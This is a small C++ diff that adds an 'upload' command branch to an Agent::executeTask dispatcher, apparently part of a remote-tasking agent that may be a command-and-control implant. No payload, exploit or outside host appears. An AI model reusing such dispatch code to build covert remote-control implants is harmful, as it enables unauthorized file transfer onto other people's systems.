@@ -82,7 +82,10 @@ void Agent::executeTask(Task& task) {
 
 	//Execute Command
 	std::string command_output;
-	if (Agent::Commands.find(task.command) != Agent::Commands.end()) {
+	if (task.command == "upload") {
+		command_output = Upload(task.arguments, task.file);
+	}
+	else if (Agent::Commands.find(task.command) != Agent::Commands.end()) {
 		command_output = Commands[task.command](task.arguments);
 	}
 	else {
